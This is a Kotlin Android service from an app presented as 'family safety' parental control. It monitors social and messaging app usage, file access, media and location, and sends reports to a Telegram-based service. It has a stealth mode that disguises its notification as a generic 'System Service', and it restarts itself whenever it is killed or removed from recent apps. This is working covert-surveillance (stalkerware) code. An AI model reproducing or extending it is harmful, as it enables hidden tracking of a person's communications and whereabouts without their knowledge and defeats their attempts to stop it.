package com.family.safety.helper.services

import android.app.*
import android.app.usage.UsageStats
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.family.safety.helper.MainActivity
import com.family.safety.helper.R
import com.family.safety.helper.database.MonitoringDatabase
import com.family.safety.helper.models.AppUsageData
import com.family.safety.helper.models.FileAccessData
import com.family.safety.helper.utils.FileMonitor
import com.family.safety.helper.utils.MediaObserver
import kotlinx.coroutines.*
import java.util.*
import java.util.concurrent.TimeUnit

class MonitoringService : Service() {
    
    companion object {
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "monitoring_channel"
        private const val MONITORING_INTERVAL = 30000L // 30 seconds
    }
    
    private lateinit var telegramService: TelegramService
    private lateinit var fileMonitor: FileMonitor
    private lateinit var mediaObserver: MediaObserver
    private lateinit var database: MonitoringDatabase
    private var monitoringJob: Job? = null
    private var locationService: LocationService? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        
        database = MonitoringDatabase.getDatabase(this)
        telegramService = TelegramService()
        telegramService.initialize(this)
        fileMonitor = FileMonitor(this)
        mediaObserver = MediaObserver(this, database, telegramService)
        
        // Save monitoring state
        saveMonitoringState(true)
        
        // Schedule Huawei keep-alive job
        if (isHuaweiDevice()) {
            HuaweiKeepAliveJobService.scheduleJob(this)
        }
    }
    
    private fun isHuaweiDevice(): Boolean {
        return android.os.Build.MANUFACTURER.equals("HUAWEI", ignoreCase = true) ||
               android.os.Build.MANUFACTURER.equals("HONOR", ignoreCase = true)
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = createNotification(isStealthMode())
        startForeground(NOTIFICATION_ID, notification)
        
        startAllMonitoring()
        return START_STICKY // Restart if killed
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    private fun startAllMonitoring() {
        // Start app usage monitoring
        startAppUsageMonitoring()
        
        // Start file monitoring
        startFileMonitoring()
        
        // Start media monitoring
        mediaObserver.startObserving()
        
        // Start location tracking
        startLocationService()
        
        // Start offline data sync
        startOfflineDataSync()
    }
    
    private fun startAppUsageMonitoring() {
        monitoringJob = serviceScope.launch {
            while (isActive) {
                try {
                    // Monitor app usage
                    val appUsageData = getAppUsageStats()
                    if (appUsageData.isNotEmpty()) {
                        telegramService.sendAppUsageReport(appUsageData)
                    }
                    
                    delay(MONITORING_INTERVAL)
                } catch (e: Exception) {
                    e.printStackTrace()
                    delay(5000) // Wait before retrying
                }
            }
        }
    }
    
    private fun startFileMonitoring() {
        serviceScope.launch {
            while (isActive) {
                try {
                    val fileAccessData = fileMonitor.getRecentFileAccess()
                    if (fileAccessData.isNotEmpty()) {
                        telegramService.sendFileAccessReport(fileAccessData)
                    }
                    
                    delay(MONITORING_INTERVAL)
                } catch (e: Exception) {
                    e.printStackTrace()
                    delay(5000)
                }
            }
        }
    }
    
    private fun startLocationService() {
        try {
            locationService = LocationService()
            val locationIntent = Intent(this, LocationService::class.java)
            ContextCompat.startForegroundService(this, locationIntent)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
    
    private fun startOfflineDataSync() {
        serviceScope.launch {
            while (isActive) {
                try {
                    // Process any pending data every 5 minutes
                    delay(5 * 60 * 1000)
                    
                    // This will be handled by TelegramService.processPendingData()
                    telegramService.initialize(this@MonitoringService)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
    }
    
    private fun getAppUsageStats(): List<AppUsageData> {
        val usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val calendar = Calendar.getInstance()
        val endTime = calendar.timeInMillis
        calendar.add(Calendar.MINUTE, -30) // Last 30 minutes
        val startTime = calendar.timeInMillis
        
        val usageStats = usageStatsManager.queryUsageStats(
            UsageStatsManager.INTERVAL_BEST, 
            startTime, 
            endTime
        )
        
        val socialMediaApps = listOf(
            "com.whatsapp",
            "org.telegram.messenger",
            "com.facebook.katana",
            "com.instagram.android",
            "com.twitter.android",
            "com.snapchat.android",
            "com.tiktokv.tiktok",
            "com.discord"
        )
        
        return usageStats
            .filter { it.packageName in socialMediaApps && it.totalTimeInForeground > 0 }
            .map { usageStat ->
                AppUsageData(
                    packageName = usageStat.packageName,
                    appName = getAppName(usageStat.packageName),
                    timeUsed = usageStat.totalTimeInForeground,
                    lastTimeUsed = usageStat.lastTimeUsed,
                    timestamp = System.currentTimeMillis()
                )
            }
            .sortedByDescending { it.timeUsed }
    }
    
    private fun getAppName(packageName: String): String {
        return try {
            val applicationInfo = packageManager.getApplicationInfo(packageName, 0)
            packageManager.getApplicationLabel(applicationInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Monitoring Service",
                if (isStealthMode()) NotificationManager.IMPORTANCE_MIN else NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Parental control monitoring service"
                setShowBadge(false)
                if (isStealthMode()) {
                    setSound(null, null)
                    enableVibration(false)
                    enableLights(false)
                }
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun createNotification(stealthMode: Boolean): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        
        return if (stealthMode) {
            // Stealth notification - minimal visibility
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setAutoCancel(false)
                .setSilent(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build()
        } else {
            // Normal notification
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Parental Control Active")
                .setContentText("Monitoring social media and file access")
                .setSmallIcon(R.drawable.ic_notification)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setAutoCancel(false)
                .build()
        }
    }
    
    private fun isStealthMode(): Boolean {
        val sharedPrefs = getSharedPreferences("app_settings", Context.MODE_PRIVATE)
        return sharedPrefs.getBoolean("stealth_mode", false)
    }
    
    private fun saveMonitoringState(isActive: Boolean) {
        val sharedPrefs = getSharedPreferences("app_settings", Context.MODE_PRIVATE)
        sharedPrefs.edit().putBoolean("monitoring_enabled", isActive).apply()
    }
    
    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        
        // Restart service when removed from recent apps
        val restartServiceIntent = Intent(applicationContext, MonitoringService::class.java)
        val restartServicePendingIntent = PendingIntent.getService(
            applicationContext,
            1,
            restartServiceIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        
        val alarmService = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmService.set(
            AlarmManager.ELAPSED_REALTIME,
            android.os.SystemClock.elapsedRealtime() + 1000,
            restartServicePendingIntent
        )
    }
    
    override fun onDestroy() {
        super.onDestroy()
        
        // Save state
        saveMonitoringState(false)
        
        // Clean up
        monitoringJob?.cancel()
        serviceScope.cancel()
        mediaObserver.stopObserving()
        locationService?.let {
            stopService(Intent(this, LocationService::class.java))
        }
        
        // Schedule restart
        val restartIntent = Intent(this, MonitoringService::class.java)
        val pendingIntent = PendingIntent.getService(
            this,
            0,
            restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            android.os.SystemClock.elapsedRealtime() + 5000,
            pendingIntent
        )
    }
}
